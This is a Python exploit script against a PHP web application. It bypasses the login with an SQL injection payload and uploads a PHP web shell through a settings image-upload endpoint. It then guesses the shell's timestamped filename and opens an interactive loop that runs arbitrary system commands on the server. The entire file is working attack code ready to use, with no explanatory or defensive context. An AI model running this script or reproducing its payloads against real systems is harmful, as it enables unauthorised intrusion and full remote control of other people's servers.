import requests, time
from sys import argv, exit
from termcolor import cprint

try:
	url = argv[1]
except:
	print("[?] Use: python3 script.py url")
	exit()

if url.endswith("/"):
	url = url[:-1]

def login_bypass(url):
	payload = {
	"username": "behindyk1' or 1=1#",
	"password": "behindyk1' or 1=1#"
	}
	r = requests.post(f"{url}/classes/Login.php?f=login", data=payload)
	if "success" in r.text:
		cprint("[+] Success: Bypass authentication", "green")
		return r.cookies['PHPSESSID']
	else:
		cprint("[-] Error: Bypass authentication\n", "red")
		exit()

def command_execution(cookie, url, timestamp):
	cprint("[~] Working on finding the shell name in the target system...", "blue")
	shell_name = "cmd.php"
	for timestamp in range(timestamp-50, timestamp+50):
		shell_path = f"{url}/uploads/{timestamp}_{shell_name}"
		t = requests.get(shell_path)
		if t.status_code == 200:
			shell_name = f"{timestamp}_cmd.php"
			cprint(f"[+] Success: Finding shell in the target system", "green")
			print(shell_path, end="\n\n")
			break
	
	while "_" in shell_name:
		try:
			command = input("$ ")
			shell_exec = f"{shell_path}?cmd={command}"
			r = requests.get(shell_exec, cookies=cookie)
			print(r.text)
		except KeyboardInterrupt:
			return cprint("\n\n[-] User aborted!", "red")

	return cprint("[-] Could not find the shell in the target system!", "yellow")

def upload_shell(cookie, url):
	upload_path = f"{url}/classes/SystemSettings.php?f=update_settings"
	content = """<?php
if(isset($_REQUEST['cmd'])){
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        die;
}
?>

Usage: cmd.php?cmd=id"""
	file = {
		"img": ("cmd.php", content)
	}
	data = {
		"name": "PWNED"
	}
	r = requests.post(upload_path, files=file, data=data, cookies=cookie)
	timestamp = int(time.time())
	if('1' in r.text and r.status_code == 200):
		cprint(f"[+] Success: Upload shell", "green")
		return command_execution(cookie, url, timestamp)
	else:
		cprint("[-] Error: Upload shell\n", "red")
		exit()

cookie = {
	"PHPSESSID": login_bypass(url)
}

upload_shell(cookie, url)
